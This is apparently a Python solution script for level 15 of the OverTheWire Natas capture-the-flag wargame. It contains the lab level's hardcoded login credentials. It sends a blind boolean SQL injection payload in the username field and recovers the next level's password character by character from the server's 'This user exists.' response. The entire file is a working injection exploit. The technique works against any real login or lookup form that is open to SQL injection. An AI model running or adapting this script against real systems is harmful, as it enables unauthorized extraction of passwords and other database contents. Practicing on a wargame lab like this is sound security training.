import requests
import string
import re

# Define credentials and target URL
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
url = "http://natas15.natas.labs.overthewire.org/"

# Define characters to be used in the password
possible_characters = string.ascii_letters + string.digits

# Create a session object to keep track of cookies
session = requests.Session()

# Initialize flag, temporary password and index
flag_characters = []
temp_password = ""
index = 0

# Define pattern to check if user exists
exists_pattern = "This user exists."

# Loop through all possible password characters until the password is found
while True:
    # Add a character to the temporary password if the flag is not empty,
    # otherwise start with the first character in the list of possible characters
    if flag_characters:
        temp_password = (
            "".join(flag_characters)
            + possible_characters[index % len(possible_characters)]
        )
    else:
        temp_password = possible_characters[index % len(possible_characters)]

    # Craft a SQL query to check if a user with the given password exists
    payload = {"username": f'natas16" AND password LIKE BINARY "{temp_password}%" # '}

    # Send the request to the server with the SQL query as data
    response = session.post(url, data=payload, auth=(username, password))

    # Check if the response contains the expected pattern (i.e. user exists)
    check = re.search(exists_pattern, response.text)

    # If the pattern is found, add the character to the flag_characters
    if check is not None:
        flag_characters.append(possible_characters[index % len(possible_characters)])

    # If the flag_characters length is 32, we have found the password and can exit the loop
    if len("".join(flag_characters)) == 32:
        break

    # Increment the index to try the next character
    index += 1

# Convert the list of flag_characters to a string to get the final password
password = "".join(flag_characters)

# Print the password
print(f"Password to level 16: {password}")
